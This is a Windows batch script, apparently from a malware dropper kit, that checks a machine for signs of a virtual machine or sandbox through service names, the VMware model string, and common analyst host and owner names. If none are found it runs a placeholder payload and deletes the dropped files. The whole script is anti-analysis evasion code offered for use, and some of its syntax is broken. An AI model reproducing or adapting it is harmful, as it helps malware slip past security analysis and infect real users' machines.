@echo off
owner1="Registered Owner:                 admin"
owner2="Registered Owner:                 Windows User"
owner3="Registered Owner:                 John"
host1="Host Name:                 USER-PC"
host2="Host Name:                 JOHN-PC"

REM # Authered by b1krb7
REM -----------------------------------------------------------------------------------
REM # Simple bat script to check the environment for signs of virtualization.
REM # Powershell downloader, with a preBat script to execute the VM Detection bat
REM # from a hidden window.
REM # These scripts are executed once the SFX Archive unzips itself into Temp directory
REM # If signs of virtualization is found, the payload will be deleted.
REM # If the machine seems real, the payload is run and then the dropped file deleted from system.
REM # [!] Any extra strings can easily be added
REM # ** !!Important!! **
REM # Change PAYLOAD to the name of the payload to be run.
REM -----------------------------------------------------------------------------------

REM -------------------------------
REM # Checks for VMIService
REM -------------------------------


del SFX_Downloader.ps1
del preV.bat
tasklist | findstr "vmicsvc" > svc.log
if exist svc.log (
for %%x in (svc.log) do if not %%~zx==0 (
	    del PAYLOAD.zip.exe
      	    del checkV.bat
) else (
	    del svc.log
      	    systeminfo | findstr "Model:" > vm.log												
	    set /p var= < vm.log
	    del vm.log


REM -------------------------------
REM # Checks for the System model
REM -------------------------------       
      
	    if "%var%"=="System Model:              Virtual Machin" (
            del PAYLOAD.zip.exe
            del checkV.bat
	    ) else (
		        if "%var%"=="System Model:              VMware7,1" (
			          del PAYLOAD.zip.exe
                		  del checkV.bat
		        ) else (
                		  systeminfo | findstr "^Host Name:$" > name.log	
			          set /p name= < name.log
			          del name.log
		  ))

      
REM -------------------------------
REM # Checks the associated Host Name
REM -------------------------------
      
		  if "%name%"=="%host1%" (
			        del PAYLOAD.zip.exe
              			del checkV.bat
		  ) else (
			        if "%name%"=="%host2%" (
				            del PAYLOAD.zip.exe
                    			    del checkV.bat
			        ) else (
				            systeminfo | findstr "Owner:" > own.log			
				            set /p own= < own.log
				            del own.log
		  ))
	
  
REM -------------------------------
REM # Checks the registered Owner
REM -------------------------------     
      
		  if "%own%"=="%owner1%" (
			      del PAYLOAD.zip.exe
            		      del checkV.bat
		  ) else (
			      if "%own%"=="%owner2%" (
			              del PAYLOAD.zip.exe
                    		      del checkV.bat
			      ) else (
				            if "%own%"=="%owner3" (
					                 del PAYLOAD.zip.exe
                           				 del checkV.bat
				    ) else (
					          start PAYLOADTOEXECUTE
                    				  timeout 2
                    				  del PAYLOADTOEXECUTE
                    				  del checkV.bat
		        )))
	    )
)
